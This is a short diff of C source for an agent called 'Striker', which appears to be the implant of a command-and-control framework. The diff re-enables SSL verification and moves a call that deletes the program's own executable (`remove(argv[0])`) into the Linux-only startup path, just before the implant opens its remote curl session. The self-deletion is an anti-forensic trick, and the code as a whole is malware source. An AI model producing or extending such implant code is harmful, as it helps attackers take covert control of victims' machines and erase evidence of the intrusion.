@@ -11,7 +11,7 @@
  * Uncomment the following macro to disable SSL verification.
  * Insecure, but required for using self-signed SSL certs.
  */
-#define INSECURE_SSL
+// #define INSECURE_SSL
 
 // Uncomment the below macro to enable debug output
 // #define STRIKER_DEBUG
@@ -1922,11 +1922,11 @@ void cleanup_session(session *striker){
 
 int main(int argc, char **argv){
   
-  remove(argv[0]);
   #ifdef STRIKER_DEBUG
   printf("[*] Starting Striker...\n");
   #endif
   #ifdef IS_LINUX
+  remove(argv[0]);
   curl_global_init(CURL_GLOBAL_ALL);
   start_session();
   curl_global_cleanup();
